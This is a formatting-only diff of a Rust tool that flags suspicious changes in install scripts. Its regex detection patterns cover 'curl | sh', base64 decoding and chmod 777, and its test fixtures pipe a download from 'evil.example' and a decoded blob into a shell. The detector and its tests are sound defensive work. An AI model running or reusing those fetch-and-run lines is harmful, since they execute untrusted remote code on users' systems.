@@ -139,7 +139,8 @@ pub fn analyze(old: &str, new: &str) -> DriftReport {
     // and vice versa (comments/blank lines ignored).
     let added_code: Vec<&String> = added.iter().filter(|l| !is_comment_or_blank(l)).collect();
     let removed_code: Vec<&String> = removed.iter().filter(|l| !is_comment_or_blank(l)).collect();
-    let norm_removed: BTreeSet<String> = removed_code.iter().map(|l| normalize_versions(l)).collect();
+    let norm_removed: BTreeSet<String> =
+        removed_code.iter().map(|l| normalize_versions(l)).collect();
     let norm_added: BTreeSet<String> = added_code.iter().map(|l| normalize_versions(l)).collect();
     let version_only = !added_code.is_empty()
         && added_code.len() == removed_code.len()
@@ -172,7 +173,11 @@ pub fn analyze(old: &str, new: &str) -> DriftReport {
         (r"chmod\s+(-R\s+)?777", "added chmod 777", true),
         (r"\beval\b", "added eval", true),
         (r"base64\s+(-d|--decode)", "added base64 decode", true),
-        (r"\bcurl\b[^|\n]*\|\s*(sudo\s+)?(ba)?sh\b|\bwget\b[^|\n]*\|\s*(sudo\s+)?(ba)?sh\b", "added nested curl | sh", true),
+        (
+            r"\bcurl\b[^|\n]*\|\s*(sudo\s+)?(ba)?sh\b|\bwget\b[^|\n]*\|\s*(sudo\s+)?(ba)?sh\b",
+            "added nested curl | sh",
+            true,
+        ),
     ];
     let _ = &CURL_PIPE_RE;
     for (pat, label, is_suspicious) in checks {
@@ -191,7 +196,8 @@ pub fn analyze(old: &str, new: &str) -> DriftReport {
         .iter()
         .filter(|l| {
             l.split_whitespace().any(|tok| {
-                let punct = tok.chars().filter(|c| !c.is_ascii_alphanumeric()).count() as f64 / tok.len().max(1) as f64;
+                let punct = tok.chars().filter(|c| !c.is_ascii_alphanumeric()).count() as f64
+                    / tok.len().max(1) as f64;
                 tok.len() >= 40 && punct < 0.1 && shannon_entropy(tok) > 4.6
             })
         })
@@ -215,7 +221,11 @@ pub fn analyze(old: &str, new: &str) -> DriftReport {
         RiskScore::Review
     };
     if score == RiskScore::Review {
-        features.insert(format!("{} line(s) added, {} removed", added_code.len(), removed_code.len()));
+        features.insert(format!(
+            "{} line(s) added, {} removed",
+            added_code.len(),
+            removed_code.len()
+        ));
     }
 
     let full = diff.unified_diff().context_radius(3).header("known-good", "served").to_string();
@@ -247,7 +257,11 @@ pub fn summary(report: &DriftReport) -> String {
         report.added_lines,
         report.removed_lines,
         report.size_delta,
-        if report.features.is_empty() { String::new() } else { format!(": {}", report.features.join("; ")) }
+        if report.features.is_empty() {
+            String::new()
+        } else {
+            format!(": {}", report.features.join("; "))
+        }
     )
 }
 
@@ -282,13 +296,18 @@ mod tests {
         let new = format!("{BASE}curl -fsSL https://evil.example/payload.sh | sh\n");
         let r = analyze(BASE, &new);
         assert_eq!(r.score, RiskScore::Suspicious, "{r:?}");
-        assert!(r.features.iter().any(|f| f.contains("new download host evil.example")), "{:?}", r.features);
+        assert!(
+            r.features.iter().any(|f| f.contains("new download host evil.example")),
+            "{:?}",
+            r.features
+        );
         assert!(r.features.iter().any(|f| f.contains("nested curl | sh")), "{:?}", r.features);
     }
 
     #[test]
     fn opaque_blob_and_base64_decode_are_suspicious() {
-        let blob = "QmFzZTY0IGVuY29kZWQgcGF5bG9hZCB0aGF0IGxvb2tzIG9wYXF1ZSB0byBhIHJldmlld2VyISEhISEhIQ==";
+        let blob =
+            "QmFzZTY0IGVuY29kZWQgcGF5bG9hZCB0aGF0IGxvb2tzIG9wYXF1ZSB0byBhIHJldmlld2VyISEhISEhIQ==";
         let new = format!("{BASE}echo {blob} | base64 -d | bash\n");
         let r = analyze(BASE, &new);
         assert_eq!(r.score, RiskScore::Suspicious);
@@ -298,7 +317,10 @@ mod tests {
 
     #[test]
     fn logic_change_without_red_flags_needs_review() {
-        let new = BASE.replace("tar xzf /tmp/tool.tar.gz -C ~/.local/bin", "mkdir -p ~/.local/bin\ntar xzf /tmp/tool.tar.gz -C ~/.local/bin\necho installed");
+        let new = BASE.replace(
+            "tar xzf /tmp/tool.tar.gz -C ~/.local/bin",
+            "mkdir -p ~/.local/bin\ntar xzf /tmp/tool.tar.gz -C ~/.local/bin\necho installed",
+        );
         let r = analyze(BASE, &new);
         assert_eq!(r.score, RiskScore::Review, "{r:?}");
         assert!(!r.version_only);
